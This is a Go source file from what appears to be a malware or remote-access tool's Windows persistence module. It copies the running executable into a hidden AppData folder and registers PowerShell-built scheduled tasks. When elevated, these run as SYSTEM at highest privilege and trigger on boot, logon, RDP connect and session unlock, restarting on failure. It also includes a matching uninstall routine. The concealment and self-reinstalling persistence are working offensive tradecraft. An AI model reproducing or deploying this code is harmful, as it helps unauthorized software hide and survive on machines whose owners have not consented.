//go:build windows && persist_taskscheduler
// +build windows,persist_taskscheduler

package persistence

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func init() {
	persistInstallFns = append(persistInstallFns, installTaskSchedulerFull)
	persistUninstallFns = append(persistUninstallFns, uninstallTaskScheduler)
}

func installTaskSchedulerFull(exePath string) error {
	targetPath, err := getAppDataTargetPath()
	if err != nil {
		return err
	}
	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}
	tryHideDirectory(dir)
	if !strings.EqualFold(filepath.Clean(exePath), filepath.Clean(targetPath)) {
		if err := replaceExecutable(exePath, targetPath); err != nil {
			return err
		}
	}
	return installTaskScheduler(targetPath)
}

func installTaskScheduler(targetPath string) error {
	taskName := deriveTaskName(targetPath)
	safe := strings.ReplaceAll(targetPath, "'", "''")

	var script string
	if isElevated() {
		// When elevated, register triggers for:
		// 1) System Boot (-AtStartup)
		// 2) User Logon (-AtLogOn)
		// 3) RDP / Session Connect (RemoteConnect = 3, ConsoleConnect = 1, SessionUnlock = 8)
		// Running as SYSTEM with Highest run level
		script = fmt.Sprintf(
			`$a = New-ScheduledTaskAction -Execute '%s'; `+
				`$tStartup = New-ScheduledTaskTrigger -AtStartup; `+
				`$tLogon = New-ScheduledTaskTrigger -AtLogOn; `+
				`$tRemoteConnect = [wmiclass]"Root\Microsoft\Windows\TaskScheduler:MSFT_TaskSessionStateChangeTrigger"; `+
				`$tr1 = $tRemoteConnect.CreateInstance(); $tr1.StateChange = 3; `+
				`$tr2 = $tRemoteConnect.CreateInstance(); $tr2.StateChange = 1; `+
				`$tr3 = $tRemoteConnect.CreateInstance(); $tr3.StateChange = 8; `+
				`$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1); `+
				`$p = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; `+
				`Register-ScheduledTask -TaskName '%s' -Action $a -Trigger @($tStartup, $tLogon, $tr1, $tr2, $tr3) -Settings $s -Principal $p -Force | Out-Null`,
			safe, taskName)
	} else {
		// Standard non-elevated user logon and session connect triggers
		script = fmt.Sprintf(
			`$a = New-ScheduledTaskAction -Execute '%s'; `+
				`$tLogon = New-ScheduledTaskTrigger -AtLogOn; `+
				`$tRemoteConnect = [wmiclass]"Root\Microsoft\Windows\TaskScheduler:MSFT_TaskSessionStateChangeTrigger"; `+
				`$tr1 = $tRemoteConnect.CreateInstance(); $tr1.StateChange = 3; `+
				`$tr2 = $tRemoteConnect.CreateInstance(); $tr2.StateChange = 1; `+
				`$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable; `+
				`$p = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; `+
				`Register-ScheduledTask -TaskName '%s' -Action $a -Trigger @($tLogon, $tr1, $tr2) -Settings $s -Principal $p -Force | Out-Null`,
			safe, taskName)
	}
	return runPowerShell(script)
}

func uninstallTaskScheduler() error {
	prefix := executablePrefix()
	return runPowerShell(
		`Get-ScheduledTask -ErrorAction SilentlyContinue | ` +
			`Where-Object { $_.TaskName -like '` + prefix + `*' } | ` +
			`Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue`)
}
